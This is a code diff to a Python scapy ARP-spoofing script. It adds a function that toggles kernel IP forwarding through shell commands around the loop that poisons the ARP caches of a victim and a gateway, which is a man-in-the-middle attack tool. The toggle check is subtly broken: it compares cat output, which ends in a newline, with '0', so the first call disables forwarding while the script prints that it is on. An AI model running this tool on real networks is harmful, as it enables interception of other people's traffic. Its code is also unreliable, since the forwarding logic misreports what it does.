@@ -4,13 +4,20 @@ from scapy.layers.l2 import ARP, Ether
 from scapy.sendrecv import srp
 from scapy.all import conf, sendp
 import time
-import sys, os
+import sys, os, subprocess
 
 def root_check():
     if os.geteuid() != 0:
         sys.exit("[!] This script must run as root")
     else:
         print("[*] Welcome to the ARP Spoofer.")
+
+def toggle_forwarding():
+    toggle = subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True, text=True, check=True)
+    if toggle.stdout == "0":
+        subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
+    else:
+        subprocess.run(["echo 0 > /proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
 
 packet_count = 0
 
@@ -73,6 +80,8 @@ if __name__ == "__main__":
     gateway_ip = args.gateway
 
     try:
+        toggle_forwarding()
+        print("[*] Forwarding toggled to ON")
         while True:
             success1 = spoof_arp(target_ip=gateway_ip, spoof_ip=victim_ip)
             success2 = spoof_arp(target_ip=victim_ip, spoof_ip=gateway_ip)
@@ -91,4 +100,9 @@ if __name__ == "__main__":
             print("[!] Some restore packets failed to send due to MAC resolution failures.")
 
         time.sleep(2)
-        print("[*] ARP table restored. Exiting.")
+        print("[*] ARP table restored.")
+        toggle_forwarding()
+        print("[*] Forwarding toggled to OFF")
+
+    except Exception as e:
+        print(f"[!] Encountered an error: {e}")
